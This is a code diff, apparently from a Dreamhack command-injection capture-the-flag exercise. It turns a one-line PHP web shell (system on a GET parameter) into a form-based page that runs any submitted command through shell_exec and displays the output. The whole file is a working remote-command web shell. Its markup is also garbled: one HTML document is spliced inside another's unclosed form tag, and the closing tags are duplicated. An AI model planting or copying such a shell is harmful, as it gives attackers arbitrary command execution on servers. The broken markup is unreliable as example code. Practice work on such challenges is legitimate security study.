@@ -1,3 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form <!-- filepath: d:\Visual Studio Code\dreamhack\Command Injection Advanced\template.php -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Execution</title>
+</head>
+<body>
+    <h1>Command Execution Form</h1>
+    <form method="POST">
+        <label for="cmd">Enter Command:</label>
+        <input type="text" id="cmd" name="cmd" required>
+        <button type="submit">Execute</button>
+    </form>
+
+    <h2>Result:</h2>
+    <pre>
 <?php
-	system($_GET['cmd'])
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd']; 
+    echo htmlspecialchars(shell_exec($cmd)); // Execute the command and display the result
+}
 ?>
+    </pre>
+</body>
+</html>
+</body>
+</html>
